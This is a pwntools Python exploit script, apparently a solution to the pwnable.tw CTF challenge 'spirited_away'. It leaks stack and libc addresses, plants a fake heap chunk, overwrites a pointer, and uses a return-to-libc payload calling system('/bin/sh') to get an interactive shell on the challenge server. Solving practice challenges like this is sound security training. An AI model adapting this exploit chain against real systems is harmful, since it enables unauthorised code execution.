#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("spirited_away_patched")
libc = ELF("libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *0x8048643
# b *0x0804878A
b *0x080488C9
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10204
        return remote(host, port)

p = conn()

def input_data(name, age, reason, comment):
    if len(name):
        sa(p, b'name', name)
        sleep(0.01)
    slan(p, b'age', age)
    sa(p, b'movie?', reason)
    sleep(0.01)
    if len(comment):
        sa(p, b'comment', comment)
        sleep(0.01)

input_data(b'A', -1, pad(80), b'A')
ru(p, pad(80))

stack = leak_bytes(rn(p, 4))
lg("stack", stack)

rn(p, 4)

libc.address = leak_bytes(rn(p, 4), libc.symbols['_IO_2_1_stdout_'])
lg("libc base", libc.address)

sla(p, b'<y/n>', b'y')

for i in range(9):
    input_data(pad(60), -1, pad(80), pad(60))
    sla(p, b'<y/n>', b'y')
    sleep(0.01)

for i in range(90):
    input_data(b'', -1, pad(80), b'')
    sla(p, b'<y/n>', b'y')
    sleep(0.01)

heap_layout = flat(
    0, 0x41,
    p32(0) * 14,
    0, 0x11,
)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    sleep(1)

layout_addr = stack - 0x68
input_data(pad(), -1, heap_layout, pad(84) + p32(layout_addr))

sla(p, b'<y/n>', b'y')

pl = flat(
    pad(0x4c),
    libc.symbols['system'],
    pad(4),
    binsh(libc)
)

input_data(pl, -1, pad(), pad())

ia(p)